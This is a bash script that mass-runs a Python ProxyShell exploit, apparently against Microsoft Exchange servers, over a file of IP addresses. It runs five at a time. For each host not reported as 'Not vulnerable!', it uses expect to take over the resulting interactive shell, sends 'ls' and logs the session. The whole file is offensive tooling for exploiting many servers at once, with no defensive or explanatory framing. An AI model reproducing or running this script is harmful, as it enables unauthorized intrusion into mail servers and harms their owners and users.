#!/bin/bash

# Replace 'exchange_proxyshell.py' with the actual name of your Python script

# Check if the servers file argument is provided
if [ $# -eq 0 ]; then
    echo "Usage: $0 [--debug] <servers_file>"
    exit 1
fi

# Number of parallel processes
MAX_PARALLEL=5
# Array to hold PIDs
PIDS=()

debug=false

# Check for --debug flag
if [ "$1" = "--debug" ]; then
    debug=true
    shift
fi

servers_file="$1"

# Check if the servers file exists
if [ ! -f "$servers_file" ]; then
    echo "Servers file '$servers_file' not found."
    exit 1
fi

log_file="${servers_file%.txt}_log.txt"  # Creating the log file name

# Function to execute the Python script
execute_python_script() {
    local ip=$1
    local output=$(python3 exchange_proxyshell.py -u https://$ip 2>&1)
    
    echo "IP: $ip"
    if [ "$output" != "Not vulnerable!" ]; then
        if [ "$debug" = true ]; then
            echo "$output"
        else
            expect -c "
                spawn python3 exchange_proxyshell.py -u https://$ip
                expect -re \".*\" { send \"\r\"; exp_continue }
                expect -re \".*\" { send \"ls\n\"; exp_continue }
                interact
            " | tee -a "$log_file"
        fi
    fi
}

# Read IP addresses from the file and iterate
while IFS= read -r ip; do
    execute_python_script "$ip" &
    PIDS+=($!)
    
    # If the number of PIDs is greater or equal to MAX_PARALLEL, wait for them to finish
    if [ ${#PIDS[@]} -ge $MAX_PARALLEL ]; then
        wait "${PIDS[@]}"
        # Clear the array
        PIDS=()
    fi
done < "$servers_file"

# Wait for any remaining background processes to finish
wait "${PIDS[@]}"

